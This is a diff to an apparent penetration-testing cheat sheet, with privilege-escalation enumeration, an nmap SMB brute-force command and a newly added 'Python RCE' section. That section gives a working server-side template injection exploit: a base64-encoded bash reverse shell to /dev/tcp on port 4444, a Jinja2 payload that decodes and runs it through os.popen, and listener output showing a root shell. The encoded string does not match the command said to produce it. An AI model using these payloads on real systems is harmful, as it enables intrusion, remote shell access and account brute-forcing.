@@ -1,3 +1,9 @@
+
+# Adding new topics daily
+# It must need some time to complete
+
+
+
 ----------------------------------------------------------------------------------------------------------
 ## Basic enumeration on linux and windows
 | **Linux**  | **Windows** | **Purpose of command** |
@@ -28,7 +34,7 @@ find / -perm -u=s -type f 2>/dev/null
 getcap -r / 2>/dev/null
 ```
 
-`find all hidden flag.txt and read it`
+`find and read all hidden flag.txt `
 ```
 cat $(find / -name flag.txt 2>/dev/null)
 ```
@@ -361,4 +367,43 @@ Always check for updated list on https://nmap.org/nsedoc/scripts/
 map - Brute Force Accounts (be aware of account lockout!)
 ```
 nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
+```
+
+## Python RCE
+* At first check if the app is build in Python.
+* Try this, everywhere the app is taking input from the user.
+
+```python
+{{7*7}}
+```
+* if the app reflects the output as `49`.Then there might be a RCE possible.
+* now encode the payload in basse64.
+
+`input`
+```shell
+echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64
+```
+`output`
+```
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=
+```
+* now start a listener
+```
+nc -lvvp 4444
+```
+
+```python
+{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=${IFS}|base64${IFS}-d|bash').read()}}
+```
+* if everything works currectly. You should get a reverse shell.
+```shell
+nc -vv -lnp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.130.
+Ncat: Connection from 10.10.11.130:54434.
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
